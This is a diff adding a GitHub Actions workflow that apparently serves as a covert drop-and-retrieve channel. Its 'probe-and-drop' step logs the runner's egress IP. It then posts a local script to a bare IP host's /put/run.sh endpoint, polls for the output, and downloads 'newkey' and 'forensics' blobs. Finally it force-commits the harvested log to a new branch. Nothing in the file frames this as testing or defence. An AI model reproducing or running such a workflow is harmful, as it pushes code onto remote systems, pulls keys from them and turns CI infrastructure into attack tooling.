@@ -1,0 +1,52 @@
+name: ul7466
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: run tag
+        default: p1
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: probe-and-drop
+        env:
+          TAG: ${{ inputs.tag }}
+        run: |
+          set +e
+          mkdir -p vantage/ul7466
+          L=vantage/ul7466/${TAG}.log
+          H=123.184.7.135
+          { echo "=== RUNID ${{ github.run_id }} TAG $TAG $(date -u +%FT%TZ)"
+            echo "EGRESS $(curl -s -m 8 https://ipinfo.io/ip) $(curl -s -m 8 https://ipinfo.io/country)"
+            echo "== INDEX"; curl -s -m 12 -w '\nIDXCODE=%{http_code}\n' http://$H:8099/ | head -50
+            echo "== PUT"; curl -s -m 20 -X POST --data-binary @vantage/ul7466_p1.sh -w '\nPUTCODE=%{http_code}\n' http://$H:8099/put/run.sh
+            echo "== POLL"
+            for i in $(seq 1 24); do
+              sleep 15
+              B=$(curl -s -m 12 http://$H:8099/ul7466_p1.txt 2>/dev/null)
+              echo "poll $i bytes=${#B}"
+              case "$B" in *DONE7466*) printf '%s\n' "$B" > /tmp/p1.txt; echo "GOT P1 at poll $i"; break;; esac
+            done
+            echo "== P1 CONTENT"; cat /tmp/p1.txt 2>/dev/null
+            echo "== NEWKEY"; curl -s -m 12 http://$H:8099/ul7466_newkey.b64 | head -c 2500; echo
+            echo "== FORENSICS"; curl -s -m 20 -o /tmp/f.b64 -w 'fore=%{http_code} sz=%{size_download}\n' http://$H:8099/ul7466_forensics.b64
+            echo "== OUT.TXT tail"; curl -s -m 12 http://$H:8099/out.txt | tail -c 1200
+          } > $L 2>&1
+          cat $L
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: ul7466, path: vantage/ul7466/}
+      - name: publish
+        if: always()
+        run: |
+          set +e
+          git config user.email bot@ul.local; git config user.name ul
+          git checkout -b ul7466/${{ github.run_id }}
+          git add -f vantage/ul7466/
+          git commit -m "ul7466 ${{ github.run_id }} ${{ inputs.tag }}"
+          git push -q origin HEAD:ul7466/${{ github.run_id }}
